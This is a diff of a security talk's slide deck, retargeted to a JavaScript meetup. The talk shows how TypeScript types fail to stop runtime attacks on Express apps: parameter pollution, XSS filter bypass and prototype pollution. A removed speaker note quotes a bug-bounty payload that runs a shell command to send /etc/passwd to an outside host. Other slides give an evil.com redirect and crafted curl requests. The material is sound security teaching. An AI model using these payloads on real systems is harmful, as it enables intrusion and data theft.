@@ -25,7 +25,7 @@ addons:
     Liran Tal
   </div>
   <span class="text-md text-yellow-500">
-    OWASP AppSec IL 🇮🇱
+    JavaScript Israel 2025
   </span>
 </div>
 
@@ -57,32 +57,23 @@ class: text-center
 <div class="mt-10">
 
 <div>
-🌟 GitHub Star / 🏆 OpenJS Foundation Pathfinder for Security Award
-</div>
-
-<div>
-🐢 Node.js Security Advocate
-</div>
-
-<div>
-🤓 Security Researcher
+🤓 Developer |  🐢 Node.js Security Advocate  |  ☠️ Security Researcher
 </div>
 
 <div class="mt-4 flex justify-center items-center">
-
-<div class="w-1/2 mx-auto">
+  <div class="w-1/2 mx-auto">
 
 ```js
-$ snyk test [package]
+$ npm audit [package]
 
-audited 4 packages in 1s
-found 3141527818921 vulnerabilities
+audited 4 packages
+found 3,141,527,818,921 vulnerabilities
 ```
 
-</div>
+  </div>
 </div>
 
-<ArrowDraw color='yellow' class="absolute top-83 left-103 rotate-20" width="80px" />
+<ArrowDraw color='yellow' class="absolute top-72 left-103 rotate-20" width="80px" />
 
 
 <div class="ml-8">
@@ -93,7 +84,7 @@ found 3141527818921 vulnerabilities
 </div>
 
 
-<div class="flex flex-row justify-center gap-2 mt-12 align-middle">
+<div class="flex flex-row justify-center gap-2 mt-8 align-middle">
   <div class="rounded-full w-1/8 bg-white">
     <img src="./images/lirantal.png" class="p-1 object-cover rounded-full" />
   </div>
@@ -108,85 +99,9 @@ found 3141527818921 vulnerabilities
   </div>
 </div>
 
----
-layout: center
----
-
-![marked-safe-from-ai](./images/marked-safe-from-ai.png)
-
----
-layout: center
----
-
-<div class="text-center">
-
-## Just _Types_, what's all the fuss about?
-
+<div class="mt-2">
+🏆 OpenJS Foundation Pathfinder for Security Award
 </div>
-
-<!--
- So I mean, Types are easy, right?
- 
-We've had strongly typed languages for decades.
-Just add them to your codebase and you're good to go!
-
- Let's explore this a bit...
--->
-
-
----
-layout: top-title
-color: purple-light
-align: l
----
-
-:: title ::
-
-# How PHP handle type conversion 🙄
-
-:: content ::
-
-![type juggling in PHP](./images/type-juggling-in-php.png)
-
-<!--
-
-Not to dunk on PHP but if you're a PHP developer you know what I'm talking about 😅
-
-PHP is a loosely typed language, and it's known for its type juggling quirks.
-
-source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
--->
-
----
-layout: top-title
-color: amber-light
-align: l
----
-
-:: title ::
-
-# JavaScript Quirks 😆
-
-:: content ::
-
-<div class="flex items-center justify-center">
-
-<img src="./images/type-juggling-in-javascript.png" class="w-2/3" />
-
-</div>
-
-<!--
-
-But don't go too far out and feel comfortable with JavaScript either
-
-JavaScript has its own quirks too
-
-A fun example of that is why `[] == ![];` will yield `true` in JavaScript
-
-Explanation (sourced from the wtfjs GitHub repo):
-The abstract equality operator converts both sides to numbers to compare them, and both sides become the number 0 for different reasons. Arrays are truthy, so on the right, the opposite of a truthy value is false, which is then coerced to 0. On the left, however, an empty array is coerced to a number without becoming a boolean first, and empty arrays are coerced to 0, despite being truthy.
--->
-
 
 ---
 layout: center
@@ -195,87 +110,13 @@ layout: center
 ![opra types](./images/opra-types.png)
 
 ---
-layout: side-title
-color: amber-light
-align: rm-lm
+layout: center
 ---
 
-:: title ::
-
-# TypeScript is sooooo good
-
-:: content ::
-
-<v-clicks>
-
-- Code quality
-- Find bugs faster
-- Lower unit test count
-- Minimize security vulnerabilities // WAIT WHAT ??? 😮
-- Avoid type confusion in runtime // WAIT WHAT ??? 😮
-
-</v-clicks>
-
-<!--
-
-But, lucky for us JavaScript developers we have TypeScript
-
-What's the promise of TypeScript?
-
-1. Code quality - TypeScript helps you think about the function signature, the returned value and so on
-   
-2. Find bugs faster - TypeScript can run as fast as you code, no need to wait for tests to run in CI
-   
-3. Lower unit test count - TypeScript can catch a lot of bugs that you would have to write tests for
-   
-4. Minimize security vulnerabilities - TypeScript can catch a lot of security vulnerabilities because it can minimize the "unexpected behavior" part of your code (DOES IT??? 😮)
-   
-5. Avoid type confusion in runtime - TypeScript can catch a lot of type confusion bugs that would happen in runtime (REALLY??? 😮)
-
--->
+## Do you consider an additive TypeScript security benefit ?
 
 ---
-layout: top-title
-align: l
-color: amber
----
-
-:: title ::
-
-A TypeScript-powered Express Route Definition
-
-:: content :: 
-
-<div class="mt-12">
-</div>
-
-```ts {*|2|3}{lines:true}
-class UserController {
-  public getUsers: RequestHandler = async (_req: Request, res: Response) => {
-    const filterQuery: string = _req.query.filter as string || '';
-    const serviceResponse = await userService.findAll({ filter: filterQuery });
-    return handleServiceResponse(serviceResponse, res);
-  };
-}
-```
-
-<div class="mt-12">
-
-<v-click>
-
-- Does this live up to your type safety expectations?
-
-</v-click>
-
-</div>
-
-<!--
-  - What do you think about this TypeScript code?
-  - Looks ok
-  - We're typing the query parameter 'filter' as string
-  - if we run `npx tsc` this will pass
--->
-
+layout: center
 ---
 
 # Just an error in the log...
@@ -320,30 +161,12 @@ Can you spot the issue?
 <div class="mt-12">
 </div>
 
-<v-click>
-
   - Found in `dustjs-linkedin`
   - Downloaded 100,000 / month
+  - Let's appreciate that this was found as a blackbox test
 
   ![dustjs-linkedin npm package downloads](./images/dustjs-linkedin-npm-downloads.png)
 
-</v-click>
-
----
-
-# A vulnerability report that paid $10k in bug bounty
-
-![dustjs-linkedin bug bounty demo](./images/dustjs-linkedin-bug-bounty-demo.png)
-
-<!-- 
-
-"just a small typing issue"
-
-that's pocketing a pay-out of $10,000 for a string of text 😉
-
-can finish the presentation with the string payload to keep the dramatic effect:
-https://_demo.paypal.com/demo/navigation?device[]=x&device[]=y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+artsploit.com')-'
--->
 
 ---
 layout: center
@@ -364,15 +187,6 @@ layout: center
 # No, it wouldn't
 </SpeechBubble>
 
-
-<div v-click="2" class="mt-14">
-
-<SpeechBubble position="l" color='purple' shape="round" maxWidth="300px">
-
-# No, it wouldn't
-</SpeechBubble>
-
-  </div>
 </div>
 
 <div>
@@ -383,17 +197,42 @@ layout: center
 # Yes it would
 </SpeechBubble>
 </div>
-<div v-click="3" class="mt-14">
 
-<SpeechBubble position="r" color='amber-light' shape="round" maxWidth="350px">
-
-# Yes yes it would! just use TypeScript!!
-</SpeechBubble>
-
-</div>
 </div>
 
 </div>
+
+---
+layout: intro
+author: 'Liran Tal'
+color: purple-light
+---
+
+<div class="h-full flex flex-col justify-center items-center">
+
+![wesley todd about typescript security](./images/wesley-todd-about-typescript-security.png){width=95%}
+
+</div>
+
+<!-- 
+  TypeScript developers put misplaced trust in types in the same way that developers put misplaced trust in code coverage.
+-->
+
+---
+layout: top-title
+color: amber-light
+---
+
+:: title ::
+
+More than 50% of the time, developers rely on TypeScript alone for type-safety
+
+:: content ::
+
+<div class="ml-35">
+  <Tweet id="1883849641860710563"/>
+</div>
+
 
 ---
 layout: default
@@ -404,8 +243,6 @@ color: purple-light
 
 **Definition**: _Manipulating HTTP request data to bypass security controls and introduce unexpected behaviors_
 
---
-
 <v-click>
 
 <div class="flex flex-row justify-between gap-4">
@@ -415,8 +252,7 @@ color: purple-light
 ### HTTP Request
 
 ```sh
-http://example.com/
-  ?redirectURL=/admin&redirectURL=http://evil.com
+http://host/?redir=/admin&redir=http://evil.com
 ```
 
 </div>
@@ -426,10 +262,11 @@ http://example.com/
 ### Route Handler
 
 ```ts
-app.get("/", (req, res) => {
-  const redirect = req.query.redirectURL || "/home"
-  res.redirect(redirect)
-})
+app.get("/", (req, res) => 
+  {
+    const redirect = req.query.redir || "/home"
+    res.redirect(redirect)
+  })
 ```
 
 </div>
@@ -447,7 +284,7 @@ app.get("/", (req, res) => {
 ### HTTP Request
 
 ```sh
-http://example.com/users?userId[prop1][prop2]=value
+http://host/users?userId[prop1][prop2]=value
 ```
 
 </div>
@@ -491,7 +328,7 @@ layout: cover
 color: yellow
 ---
 
-# 🏴‍☠️ So, let's see some of the black magic in Express + TypeScript
+# ❌ Baseline TypeScript Security Fallacies
 
 ---
 layout: top-title
@@ -500,7 +337,7 @@ color: amber-light
 
 :: title ::
 
-# TypeScript To the Rescue?
+# Express + TypeScript Example
 
 :: content ::
 
@@ -539,69 +376,6 @@ color: amber-light
 
 :: content ::
 
-Express Route definition:
-
-```ts {all}
-app.get("/users", userController.getUsers);
-```
-
-<div v-click="1" class="mt-12"> 
-
-Then the repository layer:
-
-```ts
-export class UserRepository {
-  async findAllAsync({ filter }: { filter?: string } = {}): Promise<User[]> {
-    if (filter) {
-      return users.filter((user) => user.name.startsWith(filter));
-    }
-
-    return users;
-  }
-}
-```
-
-</div>
-
-<!-- 
-  We have a /users endpoint that serves as a REST API endpoint. It allows users to search for themselves and, in particular, to pass a filter string to match the user's name.
-
-  The repository pattern that demonstrates how this filtering is done is as follows: It exposes a findAllAsync method that receives an object with a filter property.
--->
-
----
-layout: top-title
-color: amber-light
----
-
-:: title ::
-
-# TypeScript Security Bypass #1
-
-:: content ::
-
-To query the users, a GET HTTP request is sent:
-
-```sh
-$ curl -X 'GET' -H 'accept: application/json' "http://localhost:8080/users?filter=Al"
-```
-
-<!--
-  How does the filter query string flow from the route definition onto the repository layer? Let’s explore this pattern and how TypeScript is used there.
-
--->
-
----
-layout: top-title
-color: amber-light
----
-
-:: title ::
-
-# TypeScript Security Bypass #1
-
-:: content ::
-
 The controller layer:
 
 ```ts
@@ -623,102 +397,6 @@ class UserController {
   The HTTP route definition is as follows, defining the controller code for the / route at the /users prefix and matches all the HTTP requests for the GET verb:
 -->
 
-
----
-layout: top-title
-color: amber-light
----
-
-:: title ::
-
-# TypeScript Security Bypass #1
-
-:: content ::
-
-Sending a request to `/users` endpoint with value of `Al` returns results, **as expected**.
-
-```sh
-$ curl -X 'GET' -H 'accept: application/json' "http://localhost:8080/users?filter=Al"
-{
-  "success": true,
-  "message": "Users found",
-  "responseObject": [
-    {
-      "id": 1,
-      "name": "Alice",
-      "email": "alice@example.com",
-      "age": 42,
-      "createdAt": "2025-01-13T10:51:37.118Z",
-      "updatedAt": "2025-01-18T10:51:37.118Z"
-    }
-  ],
-  "statusCode": 200
-}
-```
-
----
-layout: top-title
-color: amber-light
----
-
-:: title ::
-
-# TypeScript Security Bypass #1
-
-:: content ::
-
-Now, the `filter` query string uses the array convention `filter[]=Al` ... 🤔
-
-```sh{1|all}
-curl -X 'GET' -H 'accept: application/json' "http://localhost:8080/users?filter[]=Al"
-{
-  "success": true,
-  "message": "Users found",
-  "responseObject": [
-    {
-      "id": 1,
-      "name": "Alice",
-      "email": "alice@example.com",
-      "age": 42,
-      "createdAt": "2025-01-13T10:51:37.118Z",
-      "updatedAt": "2025-01-18T10:51:37.118Z"
-    }
-  ],
-  "statusCode": 200
-}
-```
-
-<!--
-  What if applied a type juggling attempt that changes the filter query string to an array?
-
-  So what's happening here?
--->
-
----
-layout: top-title
-color: amber-light
----
-
-:: title ::
-
-# TypeScript Security Bypass #1
-
-:: content ::
-
-```ts
-const filterQuery: any = _req.query.filter || '';
-const serviceResponse = await userService.findAll({ filter: filterQuery });
-```
-
-- JavaScript `toString` coercion
-- "Liran please don't use `any`"
-
-<!--
-  But, no surprise here either because some of you TypeScript zealots might have caught up on the horrendous TypeScript definition for `any`
--->
-
-Let's do better!
-
 ---
 layout: top-title
 color: amber-light
@@ -730,8 +408,8 @@ color: amber-light
 
 :: content ::
 
-- Drop the use of `any`
-- Use TypeScript to define the query parameter as a string
+- Let's drop the use of `any`
+- Let's use TypeScript to define the query parameter as a string
 
 ```ts{5}
 class UserController {
@@ -782,10 +460,11 @@ color: amber-light
 
 :: content ::
 
-Test the new String-typed query param: `filter[]=Al`
+Let's test our new String-typed `filter`:
 
 ```sh
 $ curl -X 'GET' -H 'accept: application/json' "http://localhost:8080/users?filter[]=Al"
+
 {
   "success": true,
   "message": "Users found",
@@ -974,20 +653,22 @@ A Secure React Server Component
 Updating our user component:
 
 ```ts {6-10}
-getUserHelloComponent: RequestHandler = async (
-  ...) => {
-    const userName = 
-      _req.query.name || "World";
+public getUserHelloComponent: RequestHandler =
+    async ( _req: Request<{}, {}, {}, 
+            UserComponentQueryString>,
+     res: Response) => {
 
-    if (!sanitizeXSS(userName)) {
-      return res.status(400)
-        .send("Bad input detected!");
+      const userName = _req.query.name || "";
+
+      if (!sanitizeXSS(userName)) {
+        return res.status(400)
+                    .send("Bad input!");
+      }
+
+      const helloComponent = `<h1>Hello,
+        ${userName}!</h1>`;
+      return res.send(helloComponent);
     }
-
-    const helloComponent = 
-      `<h1>Hello, ${userName}!</h1>`;
-    return res.send(helloComponent);
-  }
 ```
 
 :: right ::
@@ -996,8 +677,8 @@ Implementation of `sanitizeXSS`:
 
 ```ts
 function sanitizeXSS(name: string): boolean {
-  const disallowList = 
-    ["<", ">", "&", '"', "'", "/", "="];
+  const disallowList = ["<", ">", "&", '"', 
+    "'", "/", "="];
 
   return !disallowList.
     some((badInput) => name.includes(badInput));
@@ -1018,7 +699,7 @@ $ curl -G -X 'GET'
   "http://localhost:8080/users/component" 
   --data-urlencode "name=<img src=liran"
 
-Bad input detected!
+Bad input!
 ```
 
 <v-click at="1">
@@ -1085,6 +766,19 @@ So let's take a second to reflect on some of the TypeScript security fallacies w
   TypeScript is to be thought of as "defense in depth", 
   
   adding a layer for better code quality and type safety, but it isn't a security tool in itself and doesn't make any runtime guarantees.
+-->
+
+---
+layout: cover
+---
+
+<Tweet id="1883897466019590307"/>
+
+<!--
+
+  This tweet demonstrates why having an adversarial mindset that TypeScript type system is not a security tool is so important
+
+  Developers put misplaced trust in TypeScript and exchange runtime security for test cases
 -->
 
 ---
@@ -1220,31 +914,9 @@ PUT /users/123/settings/notifications
 }
 ```
 
-:: right ::
-
-2. And the controller handler as follows:
-
-```ts {all|3-6|9,11,14}
-public setUserNotificationSetting: RequestHandler = async 
-          (req: Request, res: Response) => {
-    const notificationSchema = z.object({
-      notificationType: z.string(),
-      notificationMode: z.string(),
-      notificationModeValue: z.union([z.string(), z.boolean()]),
-    });
-
-    const validationResult = notificationSchema.safeParse(req.body);
-    const { notificationType, notificationMode, notificationModeValue } = validationResult.data;
-    const userId: string = req.params.id;
-
-    await userService.setUserNotificationSetting(userId, 
-      notificationType as NotificationType, notificationMode, notificationModeValue);
-  }
-```
-
 <v-click at="2">
 
-- ✅ Typed at **runtime** with Zod
+- ✅ Typed at **runtime** with with Zod
 
 </v-click>
 
@@ -1253,6 +925,29 @@ public setUserNotificationSetting: RequestHandler = async
 - ✅ Typed at **dev-time** with TypeScript
 
 </v-click>
+
+:: right ::
+
+2. And the controller handler as follows:
+
+```ts {all|3-6|11,14}
+public setUserNotificationSetting: RequestHandler = async 
+          (req: Request, res: Response) => {
+  const notificationSchema = z.object({
+    notificationType: z.string(),
+    notificationMode: z.string(),
+    notificationModeValue: z.union([z.string(), z.boolean()]),
+  });
+
+  const schema = notificationSchema.safeParse(req.body);
+  const { notificationType, ... } = schema.data;
+  const userId: string = req.params.id;
+
+  await userService.setUserNotificationSetting(userId, 
+    notificationType as NotificationType, 
+    notificationMode, notificationModeValue);
+}
+```
 
 ---
 layout: cover
@@ -1322,9 +1017,6 @@ color: red-light
 
 - What security vulnerability did we not account for? 🤔
 
-  - ✅ We validated (strings)
-  - ❌ We didn't account for special kind of strings: `__proto__`
-
 <div class="flex flex-row justify-between gap-4">
 
 <div>
@@ -1347,7 +1039,7 @@ $ curl -X PUT
 #### 2. Service Layer
 
 ```ts {all|6-11}
-async setUserNotificationSetting() {
+async setUserNotificationSetting(){
   try {
     const userSettings = {
       ...settingsDefault,
@@ -1358,7 +1050,11 @@ async setUserNotificationSetting() {
       .notifications
         [notificationType]
         [notificationMode]
-          = notificationModeValue;
+        = notificationModeValue;
+
+    UserSettingsDB.set(
+      userId, userSettings);
+  }
 ```
 
 </div>
@@ -1453,14 +1149,13 @@ $ curl -X POST -H 'Content-Type: application/json' http://localhost:8080/users/1
 async saveUser (req: Request, res: Response) => {
     const userObject = req.body;
     userObject.id = Number.parseInt(req.params.id, 10);
-    const validationResult = UserSchema.safeParse(userObject);
+    const data = UserSchema.safeParse(userObject);
 
-    if (!validationResult.success) {}
+    if (!data.success) {}
 
     const user: User = userObject;
-    const serviceResponse = await userService.saveUser(user);
-    return handleServiceResponse(serviceResponse, res);
-  }
+    const servData = await serv.saveUser(user);
+    return handleServiceResponse(servData, res);
 ```
 
 </div>
@@ -1526,14 +1221,13 @@ $ curl -X POST -H 'Content-Type: application/json' http://localhost:8080/users/1
 async saveUser (req: Request, res: Response) => {
     const userObject = req.body;
     userObject.id = Number.parseInt(req.params.id, 10);
-    const validationResult = UserSchema.safeParse(userObject);
+    const data = UserSchema.safeParse(userObject);
 
-    if (!validationResult.success) {}
+    if (!data.success) {}
 
     const user: User = userObject;
-    const serviceResponse = await userService.saveUser(user);
-    return handleServiceResponse(serviceResponse, res);
-  }
+    const servData = await serv.saveUser(user);
+    return handleServiceResponse(servData, res);
 ```
 
 </div>
@@ -1772,54 +1466,6 @@ layout: cover
 color: purple-light
 ---
 
-### TypeScript Security Insights 💎
-
----
-layout: top-title
-color: amber-light
----
-
-:: title ::
-
-More than 50% of the time, developers rely on TypeScript alone for type-safety
-
-:: content ::
-
-<div class="ml-35">
-  <Tweet id="1883849641860710563"/>
-</div>
-
----
-layout: quote
-color: purple-light
----
-
-## TypeScript does not give any security guarantees.
-
-<!--
-  It's a tool to help you write better code, but it's not a security tool
--->
-
----
-layout: intro
-color: purple-light
----
-
-<div class="h-full flex flex-col justify-center items-center">
-
-![wesley todd about typescript security](./images/wesley-todd-about-typescript-security.png){width=95%}
-
-</div>
-
-<!-- 
-  TypeScript developers put misplaced trust in types in the same way that developers put misplaced trust in code coverage.
--->
-
----
-layout: cover
-color: purple-light
----
-
 ### TypeScript Security Learnings 🧑‍🎓
 
 <div class="flex flex-row justify-center gap-16">
@@ -1850,6 +1496,28 @@ color: purple-light
 </div>
 
 ---
+layout: center
+color: black
+---
+
+<div>
+
+![snyk typescript finding](./images/snyk-typescript-findings.png)
+
+</div>
+
+---
+layout: center
+color: black
+---
+
+<div>
+
+![snyk vscode install](./images/snyk-vscode-install.png)
+
+</div>
+
+---
 layout: credits
 color: light
 speed: 0.5
@@ -1862,12 +1530,23 @@ speed: 0.5
 </div>
 <div class="grid-item text-center mr-0- col-span-3">
   <strong>Thank You</strong><br> 
+  <span class="font-size-3 mt-0">(not in order of appearance)</span>
 </div>
 <div class="grid-item text-right mr-4 col-span-1"><strong>Event</strong></div>
 <div class="grid-item col-span-2">
-  OWASP AppSec IL 2025 <i>as The organizer crew</i>&nbsp;<mdi-open-in-new class="font-size-3 mb-0.5" />
+  JavaScript Israel meetup <i>as The organizer crew</i>&nbsp;<mdi-open-in-new class="font-size-3 mb-0.5" />
   <br/>
-  You hackers and developers <i>as the "Audience"</i>&nbsp;<mdi-open-in-new class="font-size-3 mb-0.5" /></div>
+  You wonderful people <i>as the "Audience"</i>&nbsp;<mdi-open-in-new class="font-size-3 mb-0.5" /></div>
+<div class="grid-item text-right mr-4 col-span-1"><strong>Slides</strong></div>
+<div class="grid-item col-span-2">
+Slidev<br/>
+Vue.js<br/>
+Pavel Romanov<br/>
+Karl Horky<br/>
+Wesley Todd<br/>
+Ariel Shulman<br/>
+Snyk<br/>
+</div>
 
 <div class="grid-item col-span-3 text-center mt-180px mb-auto font-size-1.5rem">
   <strong>Questions?</strong>
